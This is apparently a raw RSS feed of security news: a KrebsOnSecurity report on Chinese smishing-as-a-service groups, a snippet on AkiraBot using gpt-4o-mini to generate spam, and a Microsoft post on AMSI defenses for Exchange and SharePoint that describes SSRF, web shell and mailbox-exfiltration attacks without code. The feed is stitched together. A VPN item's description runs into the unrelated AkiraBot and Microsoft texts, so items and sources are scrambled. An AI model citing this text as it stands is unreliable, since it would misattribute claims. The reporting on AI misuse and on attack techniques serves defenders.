&lt;p&gt;In &lt;a href="https://catalyst.prodaft.com/public/report/lucid/overview" rel="noopener" target="_blank"&gt;a report&lt;/a&gt; published on March 24, the Swiss threat intelligence firm &lt;strong&gt;Prodaft&lt;/strong&gt; detailed the rapid pace of innovation coming from the Smishing Triad, which it characterizes as a loosely federated group of Chinese phishing-as-a-service operators with names like &lt;strong&gt;Darcula&lt;/strong&gt;, &lt;strong&gt;Lighthouse&lt;/strong&gt;, and the &lt;strong&gt;Xinxin Group&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Prodaft said they&amp;#8217;re seeing a significant shift in the underground economy, particularly among Chinese-speaking threat actors who have historically operated in the shadows compared to their Russian-speaking counterparts.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Chinese-speaking actors are introducing innovative and cost-effective systems, enabling them to target larger user bases with sophisticated services,&amp;#8221; Prodaft wrote. &amp;#8220;Their approach marks a new era in underground business practices, emphasizing scalability and efficiency in cybercriminal operations.&amp;#8221;&lt;/p&gt;
&lt;p&gt;A &lt;a href="https://www.silentpush.com/blog/smishing-triad/" rel="noopener" target="_blank"&gt;new report&lt;/a&gt; from researchers at the security firm &lt;strong&gt;SilentPush&lt;/strong&gt; finds the Smishing Triad members have expanded into selling mobile phishing kits targeting customers of global financial institutions like &lt;strong&gt;CitiGroup&lt;/strong&gt;, &lt;strong&gt;MasterCard&lt;/strong&gt;, &lt;strong&gt;PayPal&lt;/strong&gt;,&lt;strong&gt; Stripe&lt;/strong&gt;, and &lt;strong&gt;Visa&lt;/strong&gt;, as well as banks in Canada, Latin America, Australia and the broader Asia-Pacific region.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70946" style="width: 733px;"&gt;&lt;img alt="" class="size-full wp-image-70946" height="512" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/paypalsmish.png" width="723" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70946"&gt;Phishing lures from the Smishing Triad spoofing PayPal. Image: SilentPush.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;SilentPush found the Smishing Triad now spoofs recognizable brands in a variety of industry verticals across at least 121 countries and a vast number of industries, including the postal, logistics, telecommunications, transportation, finance, retail and public sectors.&lt;/p&gt;
&lt;p&gt;According to SilentPush, the domains used by the Smishing Triad are rotated frequently, with approximately 25,000 phishing domains active during any 8-day period and a majority of them sitting at two Chinese hosting companies: &lt;strong&gt;Tencent&lt;/strong&gt; (AS132203) and &lt;strong&gt;Alibaba&lt;/strong&gt; (AS45102).&lt;span id="more-70793"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class="p1"&gt;&amp;#8220;With nearly two-thirds of all countries in the world targeted by [the] Smishing Triad, it’s safe to say they are essentially targeting every country with modern infrastructure outside of Iran, North Korea, and Russia,&amp;#8221; SilentPush wrote. &amp;#8220;Our team has observed some potential targeting in Russia (such as domains that mentioned their country codes), but nothing definitive enough to indicate Russia is a persistent target. Interestingly, even though these are Chinese threat actors, we have seen instances of targeting aimed at Macau and Hong Kong, both special administrative regions of China.&amp;#8221;&lt;/p&gt;
&lt;p&gt;SilentPush&amp;#8217;s &lt;strong&gt;Zach Edwards&lt;/strong&gt; said his team found a vulnerability that exposed data from one of the Smishing Triad&amp;#8217;s phishing pages, which revealed the number of visits each site received each day across thousands of phishing domains that were active at the time. Based on that data, SilentPush estimates those phishing pages received well more than a million visits within a 20-day time span.&lt;/p&gt;
&lt;p class="p1"&gt;The report notes the Smishing Triad boasts it has “300+ front desk staff worldwide” involved in one of their more popular phishing kits &amp;#8212; Lighthouse &amp;#8212; staff that is mainly used to support various aspects of the group&amp;#8217;s fraud and cash-out schemes.&lt;/p&gt;
&lt;p&gt;The Smishing Triad members maintain their own Chinese-language sales channels on Telegram, which frequently offer videos and photos of their staff hard at work. Some of those images include massive walls of phones used to send phishing messages, with human operators seated directly in front of them ready to receive any time-sensitive one-time codes.&lt;/p&gt;
&lt;p&gt;As noted in February&amp;#8217;s story &lt;a href="https://krebsonsecurity.com/2025/02/how-phished-data-turns-into-apple-google-wallets/" rel="noopener" target="_blank"&gt;How Phished Data Turns Into Apple and Google Wallets&lt;/a&gt;, one of those cash-out schemes involves an Android app called &lt;strong&gt;Z-NFC&lt;/strong&gt;, which can relay a valid NFC transaction from one of these compromised digital wallets to anywhere in the world. For a $500 month subscription, the customer can wave their phone at any payment terminal that accepts Apple or Google pay, and the app will relay an NFC transaction over the Internet from a stolen wallet on a phone in China.&lt;/p&gt;
&lt;div style="text-align: center;"&gt;&lt;/div&gt;
&lt;p&gt;Chinese nationals were recently busted trying to use these NFC apps to buy high-end electronics in Singapore. And in the United States, authorities in California and Tennessee &lt;a href="https://krebsonsecurity.com/2025/03/arrests-in-tap-to-pay-scheme-powered-by-phishing/" rel="noopener" target="_blank"&gt;arrested Chinese nationals accused of using NFC apps&lt;/a&gt; to fraudulently purchase gift cards from retailers.&lt;/p&gt;
&lt;p&gt;The Prodaft researchers said they were able to find a previously undocumented backend management panel for &lt;strong&gt;Lucid&lt;/strong&gt;, a smishing-as-a-service operation tied to the XinXin Group. The panel included victim figures that suggest the smishing campaigns maintain an average success rate of approximately five percent, with some domains receiving over 500 visits per week.&lt;/p&gt;
&lt;p&gt;&amp;#8220;In one observed instance, a single phishing website captured 30 credit card records from 550 victim interactions over a 7-day period,&amp;#8221; Prodaft wrote.&lt;/p&gt;
&lt;p&gt;Prodaft&amp;#8217;s report details how the Smishing Triad has achieved such success in sending their spam messages. For example, one phishing vendor appears to send out messages using dozens of Android device emulators running in parallel on a single machine.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70950" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-70950" height="834" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/virtualandroid.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70950"&gt;Phishers using multiple virtualized Android devices to orchestrate and distribute RCS-based scam campaigns. Image: Prodaft.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;According to Prodaft, the threat actors first acquire phone numbers through various means including data breaches, open-source intelligence, or purchased lists from underground markets. They then exploit technical gaps in sender ID validation within both messaging platforms.&lt;/p&gt;
&lt;p&gt;&amp;#8220;For iMessage, this involves creating temporary Apple IDs with impersonated display names, while RCS exploitation leverages carrier implementation inconsistencies in sender verification,&amp;#8221; Prodaft wrote. &amp;#8220;Message delivery occurs through automated platforms using VoIP numbers or compromised credentials, often deployed in precisely timed multi-wave campaigns to maximize effectiveness.&lt;/p&gt;
&lt;p&gt;In addition, the phishing links embedded in these messages use time-limited single-use URLs that expire or redirect based on device fingerprinting to evade security analysis, they found.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The economics strongly favor the attackers, as neither RCS nor iMessage messages incur per-message costs like traditional SMS, enabling high-volume campaigns at minimal operational expense,&amp;#8221; Prodaft continued. &amp;#8220;The overlap in templates, target pools, and tactics among these platforms underscores a unified threat landscape, with Chinese-speaking actors driving innovation in the underground economy. Their ability to scale operations globally and evasion techniques pose significant challenges to cybersecurity defenses.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ford Merrill&lt;/strong&gt; works in security research at &lt;a href="https://www.secalliance.com/" rel="noopener" target="_blank"&gt;SecAlliance&lt;/a&gt;, a &lt;a href="https://www.csis.com/" rel="noopener" target="_blank"&gt;CSIS Security Group&lt;/a&gt; company. Merrill said he&amp;#8217;s observed at least one video of a Windows binary that wraps a Chrome executable and can be used to load in target phone numbers and blast messages via RCS, iMessage, Amazon, Instagram, Facebook, and WhatsApp.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The evidence we’ve observed suggests the ability for a single device to send approximately 100 messages per second,&amp;#8221; Merrill said. &amp;#8220;We also believe that there is capability to source country specific SIM cards in volume that allow them to register different online accounts that require validation with specific country codes, and even make those SIM cards available to the physical devices long-term so that services that rely on checks of the validity of the phone number or SIM card presence on a mobile network are thwarted.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Experts say this fast-growing wave of card fraud persists because far too many financial institutions still default to sending one-time codes via SMS for validating card enrollment in mobile wallets from Apple or Google. KrebsOnSecurity interviewed multiple security executives at non-U.S. financial institutions who spoke on condition of anonymity because they were not authorized to speak to the press. Those banks have since done away with SMS-based one-time codes and are now requiring customers to log in to the bank’s mobile app before they can link their card to a digital wallet.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70793</guid><category>A Little Sunshine</category><category>Latest Warnings</category><category>Ne'er-Do-Well News</category><category>The Coming Storm</category><category>Web Fraud 2.0</category><category>Citigroup</category><category>CSIS Security Group</category><category>Darcula</category><category>Ford Merrill</category><category>google android</category><category>iMessage</category><category>Lighthouse</category><category>mastercard</category><category>Paypal</category><category>ProDaft</category><category>Resecurity</category><category>SecAlliance</category><category>SilentPush</category><category>Smishing Triad</category><category>Stripe</category><category>Visa</category><category>Xinxin Group</category><category>Z-NFC</category><category>Zach Edwards</category></item><item><title>Your future AI Assistant still needs to earn your trust</title><link>http://privacyinternational.org/long-read/5555/your-future-ai-assistant-still-needs-earn-your-trust</link><guid isPermaLink="false">5555 at http://privacyinternational.org</guid></item><item><title>Can VPNs Be Tracked by the Police?</title><link>https://www.techrepublic.com/article/can-vpns-be-tracked-by-police/</link><description>VPNs are popular due to the fact they add security and privacy to what are otherwise fairly open Wi-Fi and public internet channels.

&lt;p&gt;The finding, documented in a &lt;a href="https://www.sentinelone.com/labs/akirabot-ai-powered-bot-bypasses-captchas-spams-websites-at-scale/"&gt;post&lt;/a&gt; published by security firm SentinelOne’s SentinelLabs, underscores the double-edged sword wielded by large language models. The same thing that makes them useful for benign tasks—the breadth of data available to them and their ability to use it to generate content at scale—can often be used in malicious activities just as easily. OpenAI revoked the spammers’ account in February.&lt;/p&gt;
&lt;h2&gt;“You are a helpful assistant”&lt;/h2&gt;
&lt;p&gt;The spam blast is the work of AkiraBot—a framework that automates the sending of messages in large quantities to promote shady search optimization services to small- and medium-size websites. AkiraBot used python-based scripts to rotate the domain names advertised in the messages. It also used OpenAI’s chat API tied to the model gpt-4o-mini to generate unique messages customized to each site it spammed, a technique that likely helped it bypass filters that look for and block identical content sent to large numbers of sites. The messages are delivered through contact forms and live chat widgets embedded into the targeted websites.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/04/openais-gpt-helps-spammers-send-blast-of-80000-messages-that-bypassed-filters/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

To help customers protect their environments and respond to these attacks, Exchange Server and SharePoint Server integrated Windows Antimalware Scan Interface (AMSI), providing an essential layer of protection by preventing harmful web requests from reaching backend endpoints. The blog outlines several attacks prevented by AMSI integration and highlights recent enhancements. The blog also provides protection and mitigation guidance and how defenders can respond.&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/04/09/stopping-attacks-against-on-premises-exchange-server-and-sharepoint-server-with-amsi/"&gt;Stopping attacks against on-premises Exchange Server and SharePoint Server with AMSI&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Exchange Server and SharePoint Server are business-critical assets and considered crown jewels for many organizations, making them attractive targets for attacks. To help customers protect their environments and respond to these attacks, Exchange Server and SharePoint Server now integrate with the Windows &lt;a href="https://learn.microsoft.com/windows/win32/amsi/antimalware-scan-interface-portal"&gt;Antimalware Scan Interface (AMSI)&lt;/a&gt;, a versatile standard that enables applications and services to work seamlessly with any AMSI-compatible antimalware product. The integration of AMSI with SharePoint and Exchange Server provides an essential layer of protection by preventing harmful web requests from reaching backend endpoints.&lt;/p&gt;



&lt;p&gt;Threat actors have consistently relied on outdated or misconfigured assets, exploiting vulnerabilities that enable them to gain a persistent foothold inside the target. For instance, in the case of Exchange Server,&amp;nbsp;&lt;a href="https://techcommunity.microsoft.com/blog/exchange/proxyshell-vulnerabilities-and-your-exchange-server/2684705"&gt;ProxyShell&lt;/a&gt; and &lt;a href="https://www.microsoft.com/en-us/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/"&gt;ProxyNotShell&lt;/a&gt; vulnerabilities were widely exploited in attacks long after they were fixed by security updates in 2021 and 2022, respectively. In these attacks, threat actors abused a combination of server-side request forgery (SSRF) and privilege escalation flaws, allowing remote code execution. Successful compromise enabled threat actors to drop web shells, conduct lateral movement, and exfiltrate sensitive data, often evading detection for extended periods. More recently, attackers have shifted to &lt;a href="https://www.microsoft.com/en-us/security/blog/2023/03/24/guidance-for-investigating-attacks-using-cve-2023-23397/"&gt;NTLM relay and credential leakage techniques.&lt;/a&gt; Office documents and emails sent through Outlook serve as effective entry points for attackers to exploit NTLM coercion vulnerabilities, given their ability to embed UNC links within them. Attackers exploit NTLM authentication by relaying credentials to a vulnerable server, potentially resulting in target account compromise. Microsoft has released &lt;a href="https://msrc.microsoft.com/blog/2024/12/mitigating-ntlm-relay-attacks-by-default/"&gt;mitigation guidance against NTLM relay attacks&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;SharePoint Server has also been a consistent target for attackers exploiting critical &lt;a href="https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability"&gt;vulnerabilities&lt;/a&gt; to gain persistent and privileged access inside the target. In recent attacks, stealthy persistence tactics, such as replacing or appending web shell code into existing files like &lt;em&gt;signout.aspx&lt;/em&gt;, installing remote monitoring and management (RMM) tools for broader access, and other malicious activities were observed.&lt;/p&gt;



&lt;p&gt;While cloud-based software offers some inherent security advantages in software updates and high availability, some organizations&amp;#8217; requirements mean they need to run on-premises Exchange and SharePoint implementations. As cyber threats continue to grow in sophistication, it has never been more important to ensure that the on-premises infrastructure remains secure. This AMSI integration on SharePoint Server and Exchange Server becomes especially important when attackers attempt to exploit security vulnerabilities, particularly zero-days. With AMSI integrated, these malicious attempts are detected and blocked in real-time, offering a critical defense mechanism while organizations work on installing official patches and updates. AMSI detections are surfaced on the Microsoft Defender portal, enabling SecOps teams to investigate, correlate with other malicious activity in the environment, and remediate.&lt;/p&gt;



&lt;p&gt;In this blog post, we discuss different types of attacks targeting Exchange and SharePoint, and demonstrate how AMSI is helping organizations protect against these attacks. We also share mitigation and protection guidance, as well as detection details and hunting queries.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="amsi-integration"&gt;AMSI integration&lt;/h2&gt;



&lt;p&gt;In both &lt;a href="https://learn.microsoft.com/sharepoint/security-for-sharepoint-server/configure-amsi-integration"&gt;SharePoint Server&lt;/a&gt; and &lt;a href="https://learn.microsoft.com/en-us/exchange/antispam-and-antimalware/amsi-integration-with-exchange?view=exchserver-2019#overview"&gt;Exchange Server&lt;/a&gt;, AMSI is integrated as a security filter module within the IIS pipeline to inspect incoming HTTP requests before they are processed by the application. The filter is triggered at the &lt;em&gt;onBeginRequest&lt;/em&gt; stage through the &lt;strong&gt;SPRequesterFilteringModule &lt;/strong&gt;for SharePoint Server and &lt;strong&gt;HttpRequestFilteringModule &lt;/strong&gt;for Exchange Server, allowing it to analyze incoming requests before they reach authentication and authorization phases. This integration ensures that potential threats are identified before they interact with internal processing, mitigating the risk of exploitation. On detecting a malicious request, the application returns a &lt;strong&gt;HTTP 400 Bad Request &lt;/strong&gt;response&lt;strong&gt;.&lt;/strong&gt;&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Diagram showing AMSI integration with SharePoint Server and Exchange Server. AMSI returns HTTP 400 bad request for malicious requests. " class="wp-image-138354 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/FIg1a.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1. Overview of AMSI Integration in SharePoint and Exchange Server&lt;/figcaption&gt;&lt;/figure&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of AMSI detecting mailbox exfiltration" class="wp-image-138355 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/FIg1b.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2. AMSI protecting against mailbox exfiltration using public tool MailSniper&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="extending-amsi-with-request-body-scan"&gt;Extending AMSI with request body scan&lt;/h3&gt;



&lt;p&gt;When AMSI was first integrated, it provided an important layer of defense by scanning incoming request headers. This was crucial for identifying malicious activity, particularly SSRF attempts. However, many modern attacks are now embedded within request bodies, rather than just in the headers. This meant that header-only scans were no longer enough to catch the full range of sophisticated threats.&lt;/p&gt;



&lt;p&gt;To address this emerging risk, we added newer improvements in both products. The Exchange Server &lt;a href="https://learn.microsoft.com/en-us/exchange/antispam-and-antimalware/amsi-integration-with-exchange?view=exchserver-2019#enable-exchange-server-amsi-body-scanning"&gt;November release&lt;/a&gt; extended capabilities to include scanning of request bodies, ensuring broader protection. A similar improvement is added to SharePoint Server currently in &lt;a href="https://learn.microsoft.com/en-us/sharepoint/security-for-sharepoint-server/configure-amsi-integration"&gt;public preview&lt;/a&gt;. These enhanced security controls are not enabled by default, making it crucial for organizations to assess for stronger protection.&lt;/p&gt;



&lt;p&gt;Microsoft recommends evaluating and enabling these extended options for better protection and visibility. These enhancements are especially important for detecting and mitigating remote code execution vulnerabilities and particularly post-authentication vulnerabilities where SSRF may not be needed. The introduction of request body scanning is a critical step in our commitment to protect these crown jewels against more sophisticated, evasive threats. With the ability to inspect the full content of incoming requests, AMSI now detects a wider range of malicious activities.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="attacks-targeting-exchange-and-sharepoint-servers"&gt;Attacks targeting Exchange and SharePoint servers&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="ssrf-exploitation"&gt;SSRF exploitation&lt;/h3&gt;



&lt;p&gt;Server-side request forgery (SSRF) can allow attackers to make unauthorized requests on behalf of the server, potentially accessing internal services, metadata endpoints, or even escalating privileges. Attackers can exploit SSRF to bypass authentication mechanisms by leveraging internal API calls. Additionally, by chaining SSRF with additional flaws, attackers could gain unauthorized access to the backend and perform arbitrary remote code execution within the environment.&lt;/p&gt;



&lt;p&gt;One example is CVE-2023-29357, a critical authentication bypass vulnerability in SharePoint Server. This flaw allowed attackers to bypass authentication and gain elevated privileges by exploiting improper validation of security tokens. In attacks, this was combined with another vulnerability, CVE-2023-24955, to achieve unauthenticated remote code execution on vulnerable SharePoint servers.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of AMSI logs for exploit " class="wp-image-138357 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Fig3-1.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3. AMSI logs for CVE-2023-29357 with spoofed X-PROOF_TOKEN and Authorization headers&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Another example is CVE-2022-41040, an AutoDiscover SSRF vulnerability in Exchange Server. By targeting AutoDiscover, attackers exploited the trust relationships within Exchange to impersonate users and trigger backend functionality that normally requires authentication, laying the groundwork for remote code execution.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of AMDI logs for CVE-2022-41040 exploit" class="wp-image-138358 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Fig4.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4. AMSI logs for CVE-2022-41040 with malformed Autodiscover Request&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;AMSI acted as &lt;a href="https://www.microsoft.com/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/"&gt;first layer of defense&lt;/a&gt; against these incidents, protecting customers against thousands of SSRF attempts observed on a daily basis, thereby breaking the exploitation chain.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="suspicious-access-indicative-of-web-shell-interaction"&gt;Suspicious access indicative of web shell interaction&lt;/h3&gt;



&lt;p&gt;In many intrusions, attackers drop web shells into public-facing directories. In one such Exchange server compromise, AMSI logged a suspicious &lt;em&gt;.aspx&lt;/em&gt; file interaction. This was highlighted by Microsoft Defender for Endpoint simply because there is no &lt;em&gt;.aspx&lt;/em&gt; file by that name in the said folder path: &lt;/p&gt;



&lt;p&gt;&lt;em&gt;C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\scripts\premium\&lt;/em&gt;. &lt;/p&gt;



&lt;p&gt;Attackers often rename web shells to legitimate filenames seen in different folder to avoid suspicion. In this case, the filename &lt;em&gt;getidtoken &lt;/em&gt;is a default shipped file but with &lt;em&gt;.htm&lt;/em&gt; extension.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="A computer screen shot of a computer code" class="wp-image-138359 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Fig5.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5. suspicious POST request logged in AMSI hinting at web shell interaction&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Similar stealthy activities have also been observed for SharePoint. In one case, the attackers modified the legitimate &lt;em&gt;signout.aspx&lt;/em&gt; file by appending web shell code. This allowed attackers to create a stealthy backdoor and maintain persistence without raising suspicion.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of an .aspx file that was appended with web shell code " class="wp-image-138360 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Fig6.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6. Modified signout.aspx with web shell code appended at the end&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;AMSI acts as a real-time inspection and defense layer similar to a web application firewall (WAF) and plays a critical role in detecting and responding to active compromises. AMSI inspects incoming requests, captures malicious web shell interactions, and logs them for analysis. This level of visibility enables Microsoft Defender for Endpoint to pinpoint the exact location of malicious files on disk, such as within Exchange’s Outlook Web Application (OWA), where attackers commonly stage web shells. By correlating AMSI network logs with suspicious activity, Microsoft Defender for Endpoint can locate and remove previously undetected files, effectively cleaning the infected server and mitigating further damage. Importantly, this capability provides durable protection, allowing defenders to monitor and react to threats even in post-compromise scenarios.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of signout.aspx with hijacked username parameter" class="wp-image-138361 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Fig7.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7. Legitimate signout.aspx with hijacked &amp;rsquo;username&amp;rsquo; parameter supplied with command&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="suspicious-mailbox-access-through-exchange-web-services-ews-abuse"&gt;Suspicious mailbox access through Exchange Web Services (EWS) abuse&lt;/h3&gt;



&lt;p&gt;Exchange Web Services (EWS) is a core component of Microsoft Exchange that allows programmatic access to mailboxes through SOAP-based APIs. While this is critical for legitimate operations such as Outlook integration, mobile sync, and third-party app, the service is also widely abused by threat actors. Notably, in incidents like &lt;a href="https://www.microsoft.com/security/blog/2023/03/24/guidance-for-investigating-attacks-using-cve-2023-23397/"&gt;CVE-2023-23397&lt;/a&gt;, EWS was used post-compromise to search mailboxes for sensitive content and exfiltrate emails over HTTPS, blending in with legitimate traffic.&lt;/p&gt;



&lt;p&gt;Attackers leverage EWS’s deep access to perform mailbox searches, download entire inboxes, and set up hidden forwarding rules, often using stolen credentials or after gaining a foothold via another Exchange vulnerability. Attackers commonly abuse EWS APIs — &lt;em&gt;GetFolder&lt;/em&gt;, &lt;em&gt;FindItem&lt;/em&gt;, and &lt;em&gt;GetItem&lt;/em&gt; — to stealthily search and exfiltrate sensitive emails from compromised mailboxes. &lt;em&gt;GetFolder&lt;/em&gt; API maps the mailbox structure, which can be used to identify key folders like Inbox and Sent Items. &lt;em&gt;FindItem&lt;/em&gt; API allows searching for emails containing specific keywords or supplied datetime filter to retrieve relevant results. Finally, &lt;em&gt;GetItem&lt;/em&gt; API is used to view full email contents and attachments.&lt;/p&gt;



&lt;p&gt;This API-driven abuse technique blends in with legitimate EWS traffic, making detection challenging without deep content inspection. AMSI addresses this with request body scanning, which enables real-time detection of suspicious search patterns, abnormal access, and targeted email theft. Below is a sequence of suspicious SOAP calls logged by AMSI when attackers attempt to exfiltrate emails.&lt;/p&gt;

AMSI logs showing suspicious sequence of SOAP operations seen during remote mailbox access&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="insecure-deserialization-leading-to-rce"&gt;Insecure deserialization leading to RCE&lt;/h3&gt;



&lt;p&gt;The PowerShell application pool is a privileged component that handles remote PowerShell sessions in Exchange, typically invoked by Exchange Control Panel (ECP) or Exchange Management Shell (EMS). It runs under SYSTEM or high-privileged service accounts, making it a prime target for misuse. After gaining access to backend PowerShell endpoints, attackers can pass crafted cmdlets and arguments that trigger operations such as arbitrary file writes and command execution. This method has been observed in major incidents like ProxyShell and ProxyNotShell, where attackers execute system-level commands via crafted PowerShell requests.&lt;/p&gt;



&lt;p&gt;A common pattern seen in these attacks is the use of legitimate management cmdlets like &lt;em&gt;Get-Mailbox&lt;/em&gt;, &lt;em&gt;New-MailboxExportRequest&lt;/em&gt;, or &lt;em&gt;Set-&lt;/em&gt; commands, but with crafted arguments or malicious serialization payloads that trigger code execution in the backend. AMSI now has complete visibility into all the backend PowerShell commands along with the passed arguments to inspect the request buffer for any suspicious API calls such as &lt;em&gt;Process.Start&lt;/em&gt;, various file write APIs and &lt;em&gt;Assembly.load&lt;/em&gt;.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of AMSI logs showing the malicious argument to Get-Mailbox cmdlet." class="wp-image-138365 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Fig9a.webp" /&gt;&lt;/figure&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of AMSI logs showing the malicious argument to Get-Mailbox cmdlet." class="wp-image-138366 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Fig9b.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9. AMSI logs showing the malicious argument to Get-Mailbox cmdlet.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="web-control-abuse"&gt;Web control abuse&lt;/h3&gt;



&lt;p&gt;Exploitation of vulnerabilities like CVE-2024-38094, CVE-2024-38024, and CVE-2024-38023 exemplify attacks that abuse Site owner privileges to execute arbitrary code on the SharePoint server. The exploitation leverages the Business Data Connectivity (BDC) feature and malicious use of the &lt;em&gt;BDCMetadata.bdcm &lt;/em&gt;file. This XML-based file defines connections to external data sources but could be abused to reference dangerous .NET classes and methods. Once the malicious&lt;em&gt; .bdcm&lt;/em&gt; file is uploaded and registered in SharePoint&amp;#8217;s BDC service (using site owner permissions), the attacker can trigger execution by creating an External List or web part that interacts with the BDC model. SharePoint processes this model and reflectively loads and executes the specified method, leading to RCE as the SharePoint service account, which typically has high privileges. With body scan enabled, the complete payload is available for inspection and surfaces &lt;em&gt;LobSystem&lt;/em&gt; type as &lt;em&gt;DotNetAssembly&lt;/em&gt; hinting at code execution. AMSI’s deep integration enables visibility into the malicious Base64 buffer, which Microsoft Defender for Endpoint leverages to detect and block code execution attempts.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of AMSI logs showing upload of malicious .bdcm file with the package content" class="wp-image-138367 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Fig10a.webp" /&gt;&lt;/figure&gt;

AMSI logs showing upload of malicious .bdcm file with the package content&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="mitigation-and-protection-guidance"&gt;Mitigation and protection guidance&lt;/h2&gt;



&lt;p&gt;As these attacks show, SharePoint and Exchange servers are high-value targets. These attacks also tend to be advanced threats with highly evasive techniques. Keeping these servers safe from these advanced attacks is of utmost importance. Here are steps that organizations can take:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Activate AMSI on Exchange Server and SharePoint Server.&lt;/strong&gt; AMSI is a versatile standard that allows applications and services to integrate with any AMSI-capable anti-malware product present on a device. Starting with SharePoint Server Subscription Edition Version 25H1, AMSI extends its scanning capabilities to include the bodies of HTTP requests. The Exchange AMSI body scanning feature was introduced with the Exchange Server November 2024 Security Update (SU). Microsoft recommends updating Exchange Server and SharePoint Server to these versions or later to take advantage of the new improved body scanning feature. This request body scan feature is critical for detecting and mitigating threats that may be embedded in request payloads, providing a more comprehensive security solution. Check prerequisites and learn how to configure AMSI in the following resources:
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/exchange/antispam-and-antimalware/amsi-integration-with-exchange?view=exchserver-2019#overview" style="font-size: 1.25rem;"&gt;AMSI integration with Exchange Server&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/sharepoint/security-for-sharepoint-server/configure-amsi-integration"&gt;Configure AMSI integration with SharePoint Server&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



